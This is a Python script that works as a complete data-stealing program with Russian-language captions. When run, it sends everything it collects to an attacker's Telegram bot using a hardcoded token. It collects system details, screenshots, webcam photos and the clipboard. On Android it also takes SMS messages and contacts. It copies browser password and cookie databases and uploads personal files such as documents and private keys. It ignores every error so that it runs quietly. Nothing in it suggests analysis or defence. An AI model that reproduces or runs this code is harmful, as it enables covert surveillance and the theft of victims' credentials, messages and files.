import os
import sys
import platform
import socket
import getpass
import subprocess
import json
import time
import base64
import io
import requests
from datetime import datetime

try:
    import psutil
except:
    psutil = None

try:
    from PIL import ImageGrab
    pil = True
except:
    pil = False

try:
    import cv2
    cv = True
except:
    cv = False

try:
    import win32clipboard
    win_cb = True
except:
    win_cb = False

TOKEN = "8441860929:AAHL7y8ujJP1rQ2TOK3sUbsrNEJByCwuEK4"
CHAT_ID = 8591339805
ANDROID = os.path.exists("/system") or "ANDROID_ROOT" in os.environ

def cmd(c, text=True):
    try:
        r = subprocess.run(c, shell=True, timeout=15, capture_output=True)
        return r.stdout.decode(errors="ignore") if text else r.stdout
    except:
        return "" if text else b""

def send(text=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}, timeout=20)
    except:
        pass

def send_file(data, name, cap=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        requests.post(url, data={"chat_id": CHAT_ID, "caption": cap}, files={"document": (name, data)}, timeout=120)
    except:
        pass

def send_photo(data):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        requests.post(url, data={"chat_id": CHAT_ID, "caption": "Фото"}, files={"photo": ("photo.jpg", data)}, timeout=120)
    except:
        pass

def get_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=10).text.strip()
    except:
        ip = "Неизвестно"
    
    user = getpass.getuser()
    host = socket.gethostname()
    os_info = f"{platform.system()} {platform.release()}"
    
    info = f"<b>Системная информация</b>\\nIP: <code>{ip}</code>\\nПользователь: {user}\\nХост: {host}\\nОС: {os_info}\\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    if psutil:
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            ram_usage = psutil.virtual_memory().percent
            disk_usage = psutil.disk_usage('/').percent
            info += f"\\nCPU: {cpu_usage}% | RAM: {ram_usage}% | Disk: {disk_usage}%"
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            info += f"\\nВремя загрузки: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}"
        except:
            pass
    
    network_info = cmd("ipconfig 2>/dev/null || ifconfig 2>/dev/null", True)
    if network_info:
        send_file(network_info.encode(), "network_info.txt", "Сетевая информация")
    
    return info

def capture_screenshot():
    if pil and platform.system() == "Windows":
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, "PNG")
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "Скриншот рабочего стола"}, files={"photo": ("screen.png", buf.getvalue())}, timeout=120)
        except:
            pass
    
    if ANDROID:
        try:
            subprocess.run(["screencap", "-p", "/sdcard/screen.png"], timeout=10)
            with open("/sdcard/screen.png", "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "Скриншот Android"}, files={"photo": ("screen.png", f.read())}, timeout=120)
            os.remove("/sdcard/screen.png")
        except:
            pass

def capture_webcam():
    if cv:
        try:
            cap = cv2.VideoCapture(0)
            time.sleep(2)
            ret, frame = cap.read()
            if ret:
                _, jpeg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                send_photo(jpeg.tobytes())
            cap.release()
        except:
            pass

def get_clipboard():
    cb = ""
    if win_cb and platform.system() == "Windows":
        try:
            win32clipboard.OpenClipboard()
            cb = str(win32clipboard.GetClipboardData())
            win32clipboard.CloseClipboard()
        except:
            pass
    elif cmd("which xclip", True) or cmd("which termux-clipboard-get", True):
        cb = cmd("xclip -o -selection clipboard 2>/dev/null || termux-clipboard-get 2>/dev/null", True)
    
    if cb.strip():
        send(f"<b>Буфер обмена:</b>\\n<pre>{cb[:2000]}</pre>")

def collect_android_data():
    if ANDROID:
        props = cmd("getprop")
        if props:
            send_file(props.encode(), "android_props.txt", "Android свойства")
        
        wifi_info = cmd("dumpsys wifi")
        if wifi_info:
            send_file(wifi_info.encode()[:75000], "wifi_info.txt", "Wi-Fi информация")
        
        sms_data = cmd("content query --uri content://sms/inbox")
        if sms_data:
            send_file(sms_data.encode()[:50000], "sms_inbox.txt", "SMS сообщения")
        
        contacts = cmd("content query --uri content://contacts/people/")
        if contacts:
            send_file(contacts.encode()[:50000], "contacts.txt", "Контакты")

def collect_files():
    paths = []
    if ANDROID:
        paths = ["/sdcard/Download", "/sdcard/DCIM", "/sdcard/Documents", "/sdcard/Pictures", "/sdcard/Movies"]
    else:
        home = os.path.expanduser("~")
        paths = [
            f"{home}/Downloads",
            f"{home}/Desktop",
            f"{home}/Documents",
            f"{home}/Pictures",
            f"{home}/Videos"
        ]
    
    important_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z', '.sql', '.db', '.key', '.pem']
    
    for path in paths:
        if os.path.exists(path):
            try:
                file_count = 0
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file_count >= 25:
                            break
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            file_ext = os.path.splitext(file)[1].lower()
                            if file_ext in important_extensions and 500 < os.path.getsize(file_path) < 15*1024*1024:
                                try:
                                    with open(file_path, "rb") as f:
                                        send_file(f.read(), file, f"Файл: {file_path}")
                                    file_count += 1
                                    time.sleep(0.5)
                                except:
                                    pass
            except:
                pass

def get_browser_data():
    if ANDROID:
        return
    
    browsers = []
    home = os.path.expanduser("~")
    
    if platform.system() == "Windows":
        browsers = [
            f"{home}/AppData/Local/Google/Chrome/User Data/Default/Login Data",
            f"{home}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
            f"{home}/AppData/Roaming/Mozilla/Firefox/Profiles"
        ]
    else:
        browsers = [
            f"{home}/.config/google-chrome/Default/Login Data",
            f"{home}/.config/microsoft-edge/Default/Login Data",
            f"{home}/.mozilla/firefox"
        ]
    
    for browser_path in browsers:
        if os.path.exists(browser_path):
            try:
                if os.path.isfile(browser_path):
                    with open(browser_path, "rb") as f:
                        send_file(f.read(), os.path.basename(browser_path), f"Браузер данные: {browser_path}")
                elif os.path.isdir(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        for file in files:
                            if file in ['logins.json', 'key4.db', 'cookies.sqlite', 'places.sqlite']:
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, "rb") as f:
                                        send_file(f.read(), file, f"Браузер: {file_path}")
                                except:
                                    pass
            except:
                pass

def get_process_list():
    if psutil:
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info']):
                try:
                    processes.append(f"{proc.info['pid']} | {proc.info['name']} | {proc.info['username']} | {proc.info['memory_info'].rss // 1024 // 1024}MB")
                except:
                    pass
            if processes:
                proc_text = "\\n".join(processes[:50])
                send_file(proc_text.encode(), "processes.txt", "Список процессов (первые 50)")
        except:
            pass

try:
    system_info = get_system_info()
    send(system_info)
    
    get_process_list()
    capture_screenshot()
    capture_webcam()
    get_clipboard()
    
    if ANDROID:
        collect_android_data()
    else:
        get_browser_data()
    
    collect_files()
    
    send("Сбор данных завершен")
    
except Exception as e:
    send(f"Ошибка: {str(e)}")
      
